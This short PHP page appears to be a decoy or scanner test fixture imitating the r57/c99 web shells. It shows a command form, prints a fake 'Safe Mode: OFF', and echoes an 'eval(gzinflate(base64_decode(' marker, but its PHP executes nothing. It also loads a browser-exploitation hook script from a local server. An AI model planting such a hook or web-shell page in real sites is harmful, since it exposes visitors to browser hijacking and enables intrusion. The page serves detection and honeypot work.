<?php

header('Cache-Control: no-cache, must-revalidate');
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html>
<head>
    <title>r57shell</title>
    <script src="http://127.0.0.1:3000/hook.js"></script>
</head>
<body>
    <h1><b>c99shell</b> v.1.0</h1>
    <br>
    <title>phpFM</title>

    <form name="myshell" method="POST">
        <input type="hidden" name="act" value="ls">
        <input type="text" name="cmd" value="whoami" size="50">
        <input type="submit" value="Execute">
    </form>

    <?php
    echo "<!-- eval(gzinflate(base64_decode( -->";
    echo "<br>Safe Mode: <font color=\"red\">OFF</font><br>";
    echo "OS: Linux<br>";
    ?>
</body>
</html>